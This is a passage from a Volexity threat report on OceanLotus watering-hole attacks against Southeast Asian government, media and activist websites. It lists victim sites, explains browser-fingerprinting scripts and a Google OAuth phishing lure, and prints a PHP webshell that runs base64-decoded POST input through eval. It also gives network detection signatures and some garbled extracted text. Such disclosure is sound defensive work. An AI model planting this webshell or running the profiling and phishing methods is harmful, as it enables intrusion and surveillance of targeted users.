The number of compromised\n\nwebsites exceeds **100. The overwhelming majority of the websites that have been**\n\ncompromised belong to Vietnamese individuals and organizations that are critical of the\n\n\n-----\n\n,\n\norganizations.\n\n### Vietnam\n\nVolexity has chosen not to list the Vietnamese websites that have been compromised, as the\n\nquantity is exceedingly large (over 80) and many of them are tied to individuals or very small\n\norganizations. However, the list below characterizes the types of websites that have been\n\nvictimized to facilitate this ongoing campaign.\n\nHuman Rights\n\nCivil Society\n\nNews/Media (English and Vietnamese Language)\n\nIndividual Bloggers\n\nReligion\n\n### ASEAN\n\n|Organization|Website|Compromised Page|\n|---|---|---|\n\n\nAssociation of Southeast\n\nAsian Nations (ASEAN)\n\n\nasean.org /modules/aseanmail/js/wp\nmailinglist.js\n\n/modules/wordpress\npopup/inc/external/wpmu\nlib/js/wpmu-ui.3.min.js\n\n\n-----\n\n|ASEAN Investment|investasean.asean.org|Main Index|\n|---|---|---|\n\n\n### Cambodia\n\n|Cambodia|Col2|Col3|\n|---|---|---|\n|Organization|Website|Compromised Page|\n|Ministry of Foreign Affairs|www.mfa.gov.kh|/jwplayer.js|\n|Ministry of Environment|www.moe.gov.kh|/other/js/jquery/jquery.js|\n|Ministry of Civil Service|www.mcs.gov.kh|Main Index|\n|National Police|www.police.gov.kh|/wp-includes/js/jquery/jquery.js?ver=1.12.4|\n\n\n-----\n\nNational\n\nAssembly\nSenate\n\nRelations and\n\nInspection\n\nMinistry of www.mosvy.gov.kh /public/js/default.js\n\nSocial Affairs,\n\nVeterans, and\n\nYouth\n\nRehabilitation\n\nNational www.necelect.org.kh Main Index\n\nElection\n\nCommittee\n\n### China\n\n**Organization** **Website** **Compromised Page**\n\nBDStar Information Service bdstarlbs.com Main Index\n\nCo.\n\nBDStar Navigation Co www navchina com Main Index\n\n|Ministry of Social Affairs, Veterans, and Youth Rehabilitation|www.mosvy.gov.kh|/public/js/default.js|\n|---|---|---|\n|National Election Committee|www.necelect.org.kh|Main Index|\n\n|China|Col2|Col3|\n|---|---|---|\n|Organization|Website|Compromised Page|\n|BDStar Information Service Co.|bdstarlbs.com|Main Index|\n\n\n-----\n\nCorporation 1.7.2.min.js\n\nChina Oilfield Services Withheld Withheld\n\nLimited\n\nChina National Offshore Oil Withheld Withheld\n\nCorporation\n\n### Laos\n\n**Organization** **Website** **Compromised Page**\n\nBokeo Province bokeo.gov.la Main Index\n\nMinistry of Public Works and www.mpwt.gov.la\n\nTransport core.js\n\n### Philippines\n\n|China Oilfield Services Limited|Withheld|Withheld|\n|---|---|---|\n|China National Offshore Oil Corporation|Withheld|Withheld|\n\n|Laos|Col2|Col3|\n|---|---|---|\n|Organization|Website|Compromised Page|\n|Bokeo Province|bokeo.gov.la|Main Index|\n|Ministry of Public Works and Transport|www.mpwt.gov.la|/media/system/js/mootools- core.js|\n\n|Organization|Website|Compromised Page|\n|---|---|---|\n\n\nArmed\n\nForces of the\n\nPhilippines\n\n\nwww.afp.mil.ph /modules/mod_js_flexslider/assets/js/jquery.easing.js\n\n\n-----\n\nPresident proper.gov.ph\n\n## JavaScript Tracking, Profiling, and Delivery Frameworks\n\nThe compromised websites are being leveraged to deliver malicious JavaScript designed to\n\nprofile and fingerprint a user on each visit. Volexity found that OceanLotus had developed\n\ntwo different JavaScript frameworks to accomplish their profiling and targeting activities.\n\nFor the purposes of this blog, we will call them Framework A and Framework B. With few\n\nexceptions, the compromised websites would only have code loading either Framework A or\n\nFramework B. Each of the hostnames and IPs were also tied to one of the two frameworks,\n\nwith none of them serving up both. The following sections will provide some detail on the\n\ntwo frameworks and their multiple scripting components.\n\n### Framework A\n\nFramework A is found on a limited number of victim sites. Initial URLs for access to\n\nFramework A are typically formatted similar to the following:\n\n\ncloudflare-api[.]com/ajax/libs/jquery/2.1.3/jquery.min.js?s=1&v=72580\n\n\nVolexity believes the v= value is unique and serves as a victim site identifier, which may not\n\nb i th d t th i t d l d t il d b l Th b i t i\n\n\n-----\n\n**Framework A, Script 1 – Host Tracking**\n\nThe first script delivered contains several support functions such as an MD5 function, a\n\nbase64 decoder, and functions for loading additional data. The goal of this script appears to\n\nbe defining everything needed to track a host across different requests.\n\nThis script defines a section of variables used in other parts of the code. The host based\n\nones are obtained from the User-Agent in the initial request.\n\nThen it will load a second JavaScript file:\n\n\n-----\n\nThe h1 and h2 values in the request are MD5 hashes of some information about the host\n\nmaking the request. The first hash, h1, is the MD5 hash of various pieces of information\n\ncollected from the browser and concatenated together.\n\nThe second hash, h2, is also an MD5 hash, but the values concatenated are the screen height\n\nand width, timezone, plugins, MIME type, and language information.\n\n\n-----\n\nThe encrypt function simply iterates over the passed string and key string and adds the\n\nASCII values at each position. Python scripts for encrypting and decrypting are as follows.\n\n_Encrypt:_\n\n\n#!/usr/bin/env python\n\nimport base64\n\nimport sys\n\nb64_data = base64.b64encode(sys.argv[2])\n\nkey = sys.argv[1]\n\nenc_data = \"\"\n\nfor i, x in enumerate(b64_data):\n\nk = key[i % len(key) -1]\n\nenc_data += chr(ord(x) + ord(k))\n\n\n-----\n\np\n\n\n_Decrypt:_\n\n\n#!/usr/bin/env python\n\nimport base64\n\nimport sys\n\nkey = sys.argv[1]\n\nb64_data = sys.argv[2]\n\nenc_data = base64.b64decode(b64_data)\n\ndec_data = \"\"\n\nfor i, x in enumerate(enc_data):\n\nk = key[i % len(key) -1]\n\ndec_data += chr(ord(x) - ord(k))\n\nprint\n\nprint base64.b64decode(dec_data)\n\nprint\n\n\n**Framework A, Script 2 – Profiling**\n\nThe second script returned starts by defining a browser_hash variable. This is composed of\n\n**h1 and the first 10 characters of h2, separated by “–“. This script then sends three GET**\n\nrequests, each with a d parameter in the query string that contains some encrypted and\n\nb 64 d d d t\n\n\n-----\n\nAnother request sends “Extended Browser Info.” This info is collected as follows:\n\nThe final request sends “WebRTC” info to obtain the host IP address.\n\n### Framework B\n\nFramework B is found on the vast majority of sites. Initial URLs for access to Framework B\n\nare simply references to JavaScript (.js) files on OceanLotus controlled sites. Volexity has\n\nfound that the URLs from Framework B do not actually matter, so long as the file extension\n\nends in .js and a referrer is sent with the request. The JavaScript will be sent back regardless\n\n\n-----\n\nThe main ASEAN website is one of the few places that contain both Framework A and\n\nFramework B.\n\nThe following code has also been appended to legitimate JavaScript loaded by the ASEAN\n\nwebsite:\n\nThis script will result in the loading of JavaScript from the following URL:\n\n\nhttp://ad.jqueryclick[.]com/assets/adv.js\n\n\n**Framework B, Script 1 – Host Tracking**\n\nThe second framework collects similar information, but handles host tracking differently.\n\nThe initial script that is delivered varies based on the host OS as determined from the User\nAgent in the request. When the script is loaded, it first makes a GET request to\n\n**https://health-ray-id[.]com/robot.txt. This returns a UUID that is sent in subsequent**\n\nrequests as either zuuid or client_zuuid.It is also saved in localStorage for the\n\ncompromised site under a key of x00Sync. The script then makes two GET requests.\n\nRequest 1:\n\n\n-----\n\nThe base64 data decodes to a JSON string containing information for tracking the host. For\n\nexample, the data below, where zuuid is the UUID returned from health-ray-id.com.\n\n\n{\"uuid\":\"62d096b35e82547b6a12607c2820f8e0\",\"zuuid\":\"ca3a8d\n\n02-a0f5-4686-9f6b-cab4a17a9e2b\",\"hash\":\"\"}\n\n\nThe uuid value (also seen as client_uuid in later requests) is also generated by the script\n\nand is stored in a cookie named ___APISID for the compromised domain. It is generated\n\n[using the fingerprintjs2 library, which creates a hash based on browser information. This is](https://github.com/Valve/fingerprintjs2)\n\nanother method for tracking users across requests. This library and several other legitimate\n\nJavaScript libraries (including the jQuery core library and others for reading/storing\n\ncookies, collecting timezone data, etc.) are typically downloaded from a CDN URL and saved\n\ninto localStorage variables to be later used by the script. They are stored as hex encoded\n\ndata in a function called x00Config.\n\nIf the client is not on the OceanLotus whitelist, this request just returns a single line of\n\nJavaScript setting a variable named timestamp. However, when the client is on the whitelist,\n\nVolexity has observed a popup window that slowly fades in on top of the legitimate website.\n\nIn a recent attack, the popup appeared Google related and would redirect to a Google OAuth\n\npage designed to fool the user into providing access to their account to a malicious Google\n\nApp. More details on this appear further down in this post.\n\nRequest 2:\n\n\n-----\n\nThis request contains two pieces of information: a history section and a navigator section.\n\nThe history section contains information about the compromised site that the JavaScript\n\nwas loaded from. It also contains certain information about the host including the User\nAgent, time and timezone, and IP addresses.\n\nThe navigator section is blank the first time the request is made. When the script is first run,\n\nit records the current time in another localStorage variable. It only populates the\n\n**navigator section if 24 hours have passed. It will also update the stored timestamp. This**\n\nmeans the large section of data in the navigator section is only sent once per day, even if\n\nthis compromised site is visited multiple times. This section includes a lot of the same\n\ninformation collected by Framework A, including MIME Types, plugins, and screen\n\ninformation. Below are a few portions of the data collected and sent back to the OceanLotus\n\nservers.\n\n\n-----\n\n-----\n\n-----\n\nAs mentioned above, if a system is not on the whitelist, the GET\n\n**/api/<BASE64_ENCODED_DATA>/adFeedback.js request will just return a timestamp**\n\nvariable. For a whitelisted system, a new script is delivered. A portion of this script shown\n\nbelow makes a request to download some additional config data.\n\nThe domain for the request is loaded from the SAPIS_ID cookie which was set by the first\n\nscript. Before storing, it is split in two, the two substrings are reversed, then it is base64\n\nencoded. An example of the SAPIS_ID cookie can be seen in the navigator section\n\nabove. This ultimately calls the e.fn_getjson() function that makes a request like the\n\nfollowing:\n\n\n-----\n\ntimestamp=59ba12f2eb1e240cd9431624&code=rtp&s1=64c6e32b951adc4f3d5661dba2330141\n\nThis returns a JSON config like the following:\n\nThese are saved and accessed via a getConfigs() function for different actions the script can\n\nperform.\n\nUltimately, the script presents a popup over the site saying the content is blocked and\n\nrequests that the visitor sign in to continue. The code below presents this page and tracks\n\nprogress using the postShow() and postDown() functions, which send GET requests using\n\nthe URLs shown above. When one of the buttons is clicked, the user is redirected to login to\n\nthe application.\n\n\n-----\n\nVolexity was able to work with organizations on the OceanLotus whitelist that received\n\nspecial responses from Framework B. As a result, Volexity was able to directly observe two\n\ndifferent OceanLotus attacks that attempted to fool the targeted user into providing access\n\nto their Google Accounts. OceanLotus attempts to compromise Google Accounts by\n\nprompting the user with a popup directing them to provide OAuth authorizations to a\n\nmalicious Google App.\n\nOnce a user has been flagged for targeting, they will receive a popup when accessing an\n\nOceanLotus compromised website once every 24 hours. This popup slowly fades in over top\n\nof the legitimate website and appears quite legitimate. Screen shots of two different\n\nobserved popups are shown below.\n\n\n-----\n\n_Version 2: Chrome Sign In_\n\nRegardless of which option the user clicks, they are redirected to Google to initiate OAuth\n\naccess to one of OceanLotus’ Google Apps. Below is a screen shot of what a user would see\n\nprior to authorizing the the nefarious Google App.\n\n\n-----\n\n-----\n\naccount and starts accessing it. The account has permissions to access all e mail and\n\ncontacts, which is all the access OceanLotus needs to conduct digital surveillance. Volexity\n\nstrongly recommends that anyone that thinks they may have been targeted with this\n\ncampaign or similar attacks review the Defense Against Ocean Lotus section below.\n\nOceanLotus is also known to be distributing malware in the form of fake Internet Explorer,\n\nChrome, and Firefox updates. Volexity has observed similar attacks via spear phishing\n\nagainst targeted organizations that leverage some of the same malware infrastructure. In\n\nthese cases, the following Amazon S3 buckets were used to distribute the malware through\n\nJavaScript as part of OceanLotus Framework B or direct links from spear phishing\n\ncampaigns.\n\ndload01.s3.amazonaws.com\n\ndownload-attachments.s3.amazonaws.com\n\nVolexity has observed multiple custom malware families and Cobalt Strike delivered\n\nthrough these campaigns. Details on the observed malware samples are forthcoming.\n\n### Victim Websites Backdoored\n\nVolexity has worked with multiple victim organizations to assist with incident response\n\nefforts and to remedy their compromised systems. This process lead to the identification of\n\ndifferent ways the OceanLotus group gains access to the compromised websites and how\n\nthey maintain access.\n\n\n-----\n\n1. Direct user account access to the website’s content management system (CMS)\n\n2. Exploitation of outdated plugins and/or CMS components\n\nIt is currently unknown how the intruders gain working credentials to the victim websites.\n\nBased on the TTPs leveraged by OceanLotus, it is possible that credentials could have been\n\nsocially engineered (phished) from the victims or that the system administrators have been\n\nbackdoored and a keylogger has assisted in capturing the login credentials. Alternatively, it\n\nis possible that some of the credentials were simply guessed. Several of the Vietnamese\n\nwebsites are running on Google’s Blogspot platform, so it is reasonable to believe that those\n\nusers’ Google accounts may be compromised. In the case of exploitation, the CMS software\n\nused by the victim organizations was often woefully out of date. Both the core components\n\nand added plugins had remotely exploitable vulnerabilities that lead to compromise.\n\n###### Persistent Access\n\nIn all examined cases, OceanLotus attackers added PHP webshells to the victim websites. In\n\nmost cases, the intruders added a new file that was designed to blend in with the web\n\ndirectory in which it was placed. In some cases, Volexity observed OceanLotus adding PHP\n\ncode to an existing legitimate file already on the webserver.\n\n\nif(@$_POST['<variable-1>']&&@md5(md5($_POST['<variable\n2>']))=='<md5 hash>') {\n\n$x=\"\\x62\\x61\\x73\\x65\\x36\\x34\\x5f\\x64\\x65\\x63\\x6f\\x64\\x65\";\n\n@eval($x($ POST['<variable 1>']));exit();\n\n\n-----\n\n**1 is set and then validates whether the MD5 of the MD5 of the value set for variable 2**\n\nmatches an expected MD5 hash. If these both evaluate as true, the contents of variable-1 are\n\nbase64 decoded and evaluated on the system. This is a simple webshell that, similar to a\n\nChina Chopper shell, allows direct execution on the system under the privileges of the\n\naccount running the webserver. The OceanLotus intruders use these shells to interact with\n\nthe system and update their JavaScript code on the various websites.\n\nOceanLotus also appears to have a potentially automated process that periodically checks if\n\nthe webshells are still present on the victim systems.\n\n## Campaign Infrastructure\n\nVolexity has identified a vast and sprawling amount of infrastructure leveraged by\n\nOceanLotus as a part of this strategic web compromise campaign. There are even more\n\nindicators associated with various malware campaigns that Volexity will detail in another\n\nOceanLotus post to follow. OceanLotus’s attack infrastructure has several unique\n\ncharacteristics, which makes it easy to identify if a particular system is under their control.\n\nAs a result, Volexity was able to identify numerous systems that were not directly observed\n\nin active attacks but are strongly believed to be tied to OceanLotus.

As a result, Volexity would recommend\n\nimmediately putting in blocks or sinkholes for the domains and IP addresses listed above to\n\nprevent profiling and possible exploitation. The observed attacks thus far have relied on\n\nsocial engineering campaigns; however, it would be trivial for OceanLotus to introduce an\n\nexploit into this chain. As for malware indicators, Volexity will be providing additional data\n\nrelated to malware and backdoor infrastructure in a future write-up to follow soon.\n\nWhen it comes to Google accounts, Volexity would recommend that users enable the 2-Step\n\nAuthentication. This is an effective way to prevent access to a Google account should the\n\npassword be compromised. However, in the case of this OceanLotus campaign, the\n\nattackers are leveraging a Google App that has OAuth authorized access to the victim’s e\nmail and contacts. This effectively bypasses 2-Step authentication as a result. Users should\n\nbe very careful to only authorize legitimate and known Google Apps. Users can verify what\n\nGoogle Apps have access to their account by visiting the following URL:\n\nhttps://myaccount.google.com/u/1/permissions\n\nThis will list the Google Apps with access to the account along with their permission levels. It\n\nis possible to defend against unauthorized applications and increase a Google Accounts\n\n[security through the Google Advanced Protection Program as well](https://landing.google.com/advancedprotection/)\n\n\n-----\n\nLog into Gmail from a web browser via https://mail.google.com\n\nScroll to the bottom of the page and click Details to see a list of recent accesses to the\n\naccount\n\nIf any access stands out as coming from an unauthorized application or address, the\n\nguidance in the steps on the following page should be reviewed:\n\nhttps://support.google.com/mail/answer/7036019\n\nFinally, for website administrators, the key recommendations are as follows:\n\nUse strong passwords for CMS and system authentication\n\nRestrict access to the system and CMS functionality as much as possible (limited users,\n\nACLs, etc.)\n\nImplement two-factor (2FA) where possible\n\nKeep operating systems, CMS software, and CMS plugins up-to-date\n\nDisable or remove any accounts that are no longer needed or are unrecognized\n\n### Network Signatures\n\nIn addition to the domains and IP addresses, the following network signatures can be used\n\nto detect various OceanLotus profiling and targeting activity.\n\n\nalert http $HOME_NET any -> $EXTERNAL_NET any (msg:”Volex – OceanLotus\n\nJ S i t L d ( t j )” fl t t bli h d t t ”GET”\n\n\n-----\n\nalert http $EXTERNAL_NET any $HOME_NET any (msg: Volex OceanLotus\n\nJavaScript Fake Page URL Builder Response”; flow:to_client,established;\n\nfile_data;content:”{|22|link|22|:|22|http”; depth:13; file_data; content:”|22|load|22|”;\n\nsid:2017083002; rev:1;)\n\nalert http $EXTERNAL_NET any -> $HOME_NET any (msg:”Volex – OceanLotus System\n\nProfiling JavaScript (linkStorage.x00SOCKET)”; flow:to_client,established; file_data;\n\ncontent:”linkStorage.x00SOCKET”; sid:2017083003;)\n\n\n## Conclusion\n\nVolexity believes the OceanLotus threat group has rapidly advanced its capabilities and is\n\nnow one of the more sophisticated APT actors currently in operation. While Volexity does\n\nnot typically engage in attempting attribution of any threat actor, Volexity does agree with\n\npreviously reported assessments that OceanLotus is likely operating out of Vietnam. This is\n\nlargely due to the extreme and wide-scale nature of certain targeting that would be\n\nextremely unlikely to align with the interests of those outside of Vietnam. As a result, Volexity\n\nbelieves that OceanLotus has been rapidly developing a highly skilled and organized\n\ncomputer network exploitation (CNE) capability.\n\n\n-----\n\n###### ABOUT\n\n[About Us](https://www.volexity.com/company/about/)\n\nBlog\n\n[Privacy Policy](https://www.volexity.com/privacy-policy/)\n\n###### CONNECT\n\n\n###### SOLUTIONS\n\n[Request A Demo](https://www.volexity.com/company/contact/)\n\n[Products](https://www.volexity.com/products-overview/)\n\n[Services](https://www.volexity.com/services-overview/)\n\n\n###### CONTACT\n\n\n\n\n\n11654 Plaza America Dr #774\n\nReston, VA 20190-4700\n\n\n## \n\n\n 1-888-825-1975\n\n© 2018 Volexity.
